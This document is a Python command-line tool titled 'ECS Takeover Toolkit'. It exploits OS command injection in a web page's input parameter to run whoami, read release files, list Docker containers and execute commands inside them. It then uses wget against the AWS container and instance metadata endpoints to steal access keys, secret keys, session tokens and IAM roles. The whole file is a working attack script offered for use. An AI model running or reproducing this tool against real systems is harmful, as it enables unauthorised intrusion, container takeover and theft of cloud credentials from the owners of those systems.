import requests
import html
import sys
import urllib3
from urllib.parse import quote 
from bs4 import BeautifulSoup
import re
import json

## Disable HTTP warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

## Proxy for debugging
#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def print_start_screen():
    banner = r"""
____________________   _________ ___________       __                                   
\_   _____/\_   ___ \ /   _____/ \__    ___/____  |  | __ ____  _______  __ ___________ 
 |    __)_ /    \  \/ \_____  \    |    |  \__  \ |  |/ // __ \/  _ \  \/ // __ \_  __ \
 |        \\     \____/        \   |    |   / __ \|    <\  ___(  <_> )   /\  ___/|  | \/
/_______  / \______  /_______  /   |____|  (____  /__|_ \\___  >____/ \_/  \___  >__|   
        \/         \/        \/                 \/     \/    \/                \/       
        ___________           .__   __   .__  __   
        \__    ___/___   ____ |  | |  | _|__|/  |_ 
          |    | /  _ \ /  _ \|  | |  |/ /  \   __\
          |    |(  <_> |  <_> )  |_|    <|  ||  |  
          |____| \____/ \____/|____/__|_ \__||__|  
"""
    return banner


def show_menu():
    print(print_start_screen())
    print("\n--- ECS Takeover Toolkit ---")
    print("1. Test RCE")
    print("2. Check OS Version")
    print("3. Check Docker Version")
    print("4. List Running Containers")
    print("5. Try Container Shell")
    print("6. Try extract AWS credentials")
    print("0. Exit")

def input_id(url):
    html = requests.get(url)
    soup = BeautifulSoup(html.text, 'html.parser')
    input_element = soup.find("input")
    input_id = input_element.get('id')
    return input_id
    return True

def rce(url):
    print("[*] Testing RCE...")
    param = ";whoami"
    param_url = quote(param)                                                                                            ## URL encode
    user_names = ["www-data", "root", "user", "apache", "http", "www", "nginx", "lighttpd", "wwwrun"]
    username_pattern = r"^(" + "|".join(re.escape(u) for u in user_names) + r")$"
    r = requests.get(url +"/?" + input_id(url) + "=" + param_url)
    rce_out = BeautifulSoup(r.text,'html.parser')
    found = False
    for line in rce_out.get_text().splitlines():
        line = line.strip()
        if re.match(username_pattern, line):
            print(f"[+] Username found: {line}")
            found = True

    if not found:
        print("[-] RCE failed")
        return False
    return True

def os_check(url):                                                                                                     ## Check OS Version
    print('[*] Checking OS Version...')
    param_os = ";cat /etc/**release**"
    param_os_url = quote(param_os)                                                                                     ## URL encode
    os = requests.get(url +"/?" + input_id(url) + "=" + param_os_url)
    os_soup = BeautifulSoup(os.text,'html.parser')
    all_para_text = ""

    for p in os_soup.find_all('p'):
        all_para_text += p.get_text() + "\n" 

    os_dec = html.unescape(all_para_text)
    os_dec_split = os_dec.splitlines()
    
    for line in os_dec_split:                                                                                               ## Searching OS Version
        line = line.strip()
        if line.startswith(("NAME", "ID", "PRETTY_NAME", "VERSION_ID")):
            version = line.split('=', 1)[1].strip().strip('"')
            print(f"[+] Version found: {version}")
    return True

def docker_check(url):                                                                                                 ## Enumerating Docker
    print("[*]Check for running Docker engine...")
    param_docker = ";docker --version"
    param_docker_url = quote(param_docker)
    docker_version =  requests.get(url +"/?" + input_id(url) + "=" + param_docker_url)
    docker_soup = BeautifulSoup(docker_version.text, 'html.parser')
    all_para_docker = ""

    for p in docker_soup.find_all('p'):
        all_para_docker += p.get_text() + "\n" 

    docker_dec = html.unescape(all_para_docker)
    docker_dec_split = docker_dec.splitlines()

    for line in docker_dec_split:
        line = line.strip()
        if line.startswith(("Docker")):
            docker_version = line.split('version', 1)[1].strip().strip('"')
            print(f"[+] Version found: {docker_version}")
    return True

def container_check(url):                                                                                              ## Check for running containers
    print("[*] Check for running Containers...")
    container_list = []
    param_container = '; docker ps --format "table {{.Status}}\t{{.Image}}\t{{.ID}}\t{{.Names}}"'
    param_container_url= quote(param_container)
    containers = requests.get(url + "/?" + input_id(url) + "=" + param_container_url)
    containers_soup = BeautifulSoup(containers.text, 'html.parser')
    all_para_containers = ""

    for p in containers_soup.find_all('p'):
        all_para_containers += p.get_text() + "\n"

    container_dec = html.unescape(all_para_containers)
    containers_dec_split = container_dec.splitlines()

    for line in containers_dec_split:
        line = line.strip()
        if line.startswith("Up"):
            if "minutes" in line:
                running_containers = line.split("minutes", 1)[-1].strip().strip('"')
            elif "seconds" in line:
                running_containers = line.split("minutes", 1)[-1].strip().strip('"')
            elif "hours" in line:
                running_containers = line.split("hours", 1)[-1].strip().strip('"')
            elif "hour" in line:
                running_containers = line.split("hour", 1)[-1].strip().strip('"')
            elif "day" in line:
                running_containers = line.split("day", 1)[-1].strip().strip('"')
            elif "days" in line:
                running_containers = line.split("days", 1)[-1].strip().strip('"')
            else:
                continue
            container_list.append(running_containers)
            print(f"[+] Found running container: {running_containers}") 

    if container_list:
        return container_list
    else:
        print("[-] No running containers found.")
        return False

def get_container_shell(url):
    print("[*] Try to exec command in container...")
    param_shell = '; docker exec '
    param_command = ' sh -c \'whoami\''
    param_shell_url = quote(param_shell)
    param_command_url = quote(param_command)
    containers = container_check(url)

    user_names = ["www-data", "root", "user", "apache", "http", "www", "nginx", "lighttpd", "wwwrun"]
    username_pattern = r"^(" + "|".join(re.escape(u) for u in user_names) + r")$"
    
    container_ids = [] 

    for container_info in containers:
        container_info = container_info.strip()
        match = re.search(r'\b[0-9a-f]{12,}\b', container_info)
        if match:
            container_id = match.group(0)
            container_ids.append(container_id)
            print(f"[*] Try shell into... {container_id}")
            whoami = requests.get(url + "/?" + input_id(url) + "=" + param_shell_url + container_id + param_command_url)
            whoami_soup = BeautifulSoup(whoami.text, 'html.parser')
            all_para_whoami = ""

            for p in whoami_soup.find_all('p'):
                all_para_whoami += p.get_text() + "\n"

            whoami_dec = html.unescape(all_para_whoami)
            whoami_dec_split = whoami_dec.splitlines()

            for line in whoami_dec_split:
                line = line.strip()
                if re.match(username_pattern, line):
                        print(f"[+] User found: {line}")
                        found = True

            if not found:
                print("[-] User enumeration not possible")

    return container_ids 

def get_aws_credentials(url):
    print("[*] Trying to extract AWS credentials from Containers...")
    param_shell = '; docker exec '
    param_cred_ext = " sh -c 'wget -O- http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'"
    param_shell_url = quote(param_shell)
    param_cred_ext_url = quote(param_cred_ext)

    container_ids = get_container_shell(url)

    found = False
    seen_roles = set()
    seen_keys = set()

    for container_id in container_ids:
        print(f"\n[+] Checking container {container_id}...")
        print("[*] Try to extract AWS Container credentials...")
        try:
            aws_creds_ext = requests.get(url + "/?" + input_id(url) + "=" + param_shell_url + container_id + param_cred_ext_url)
            aws_creds_ext.raise_for_status()
        except Exception as e:
            print(f"[-] Request failed for container credentials: {e}")
            continue

        cred_ext_soup = BeautifulSoup(aws_creds_ext.text, 'html.parser')
        all_para_creds = "\n".join(p.get_text() for p in cred_ext_soup.find_all('p'))
        cred_aws_dec_split = html.unescape(all_para_creds).splitlines()

        patterns = {
            "AccessKeyId": r'(?:"AccessKeyId"|access_key)[=:\s]+[\'"]?([A-Z0-9]{20})[\'"]?',
            "SecretAccessKey": r'(?:"SecretAccessKey"|secret_key)[=:\s]+[\'"]?([A-Za-z0-9/+=]{40})[\'"]?',
            "Token": r'(?:"Token"|session_token)[=:\s]+[\'"]?([A-Za-z0-9/+=-]+)[\'"]?',
            "Expiration": r'(?:"Expiration"|expiry)[=:\s]+[\'"]?([\dTZ:.\-]+)[\'"]?',
            "RoleArn": r'(?:"RoleArn"|role)[=:\s]+[\'"]?([a-zA-Z0-9:_/-]+)[\'"]?'
        }

        for line in cred_aws_dec_split:
            line = line.strip()
            if line and not line.startswith("; docker exec"):
                for name, pattern in patterns.items():
                    match = re.search(pattern, line, re.IGNORECASE)
                    if match:
                        value = match.group(1)
                        if name == "AccessKeyId" and value in seen_keys:
                            continue
                        print(f"[+] {name}: {value}")
                        found = True
                        if name == "AccessKeyId":
                            seen_keys.add(value)

        print("[*] Try to extract role...")
        param_role = " sh -c 'wget -O- 169.254.169.254/latest/meta-data/iam/security-credentials'"
        param_role_url = quote(param_role)

        try:
            aws_role_ext = requests.get(url + "/?" + input_id(url) + "=" + param_shell_url + container_id + param_role_url)
            aws_role_ext.raise_for_status()
        except Exception as e:
            print(f"[-] Request failed for role extraction: {e}")
            continue

        role_soup = BeautifulSoup(aws_role_ext.text, 'html.parser')
        all_param_role = "\n".join(p.get_text() for p in role_soup.find_all('p'))
        role_dec_split = html.unescape(all_param_role).splitlines()

        for role_line in role_dec_split:
            role_line = role_line.strip()
            if role_line and not role_line.startswith("; docker exec"):
                if role_line in seen_roles:
                    continue
                print(f"[+] Role found: {role_line}")
                seen_roles.add(role_line)
                print("[*] Try to extract EC2 credentials for role...")
                param_ec2_role = f" sh -c 'wget -O- 169.254.169.254/latest/meta-data/iam/security-credentials/{role_line}'"
                param_ec2_role_url = quote(param_ec2_role)

                try:
                    ec2_role_ext = requests.get(
                        url + "/?" + input_id(url) + "=" + param_shell_url + container_id + param_ec2_role_url,
                        timeout=10
                    )
                    ec2_role_ext.raise_for_status()
                except Exception as e:
                    print(f"[-] Request failed for EC2 credentials: {e}")
                    continue
                ec2_soup = BeautifulSoup(ec2_role_ext.text, 'html.parser')
                all_para_ec2 = "\n".join(p.get_text() for p in ec2_soup.find_all('p'))
                ec2_aws_dec_split = html.unescape(all_para_ec2).splitlines()

                for ec2_line in ec2_aws_dec_split:
                    ec2_line = ec2_line.strip()
                    if ec2_line and not ec2_line.startswith("; docker exec"):
                        for name, pattern in patterns.items():
                            match = re.search(pattern, ec2_line, re.IGNORECASE)
                            if match:
                                value = match.group(1)
                                if name == "AccessKeyId" and value in seen_keys:
                                    continue
                                print(f"[+] {name}: {value}")
                                found = True
                                if name == "AccessKeyId":
                                    seen_keys.add(value)

    if not found:
        print("[-] No credentials found.")
        sys.exit(1)
    else:
        print("[*] Extraction complete.")

        
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)   

    while True:
        show_menu()
        choice = input("Select an option: ").strip()

        if choice == "1":
            if rce(url):
                print('[+] RCE Complete!')
            else:
                print('[-] RCE failed.')
        elif choice == "2":
            if os_check(url):
                print('[+] RCE Complete!')
            else:
                print('[-] RCE failed.')
        elif choice == "3":
            if docker_check(url):
                print('[+] RCE Complete!')
            else:
                print('[-] RCE failed.')
        elif choice == "4":
            if container_check(url):
                print('[+] RCE Complete!')
            else:
                print('[-] RCE failed.')
        elif choice == "5":
            if get_container_shell(url):
                print('[+] RCE Complete!')
            else:
                print('[-] RCE failed.')
        elif choice == "6":
            if get_aws_credentials(url):
                print('[+] RCE Complete!')
            else:
                print('[-] RCE failed.')
        elif choice == "0":
            print("Goodbye!")
            break
        else:
            print("Invalid choice, try again.")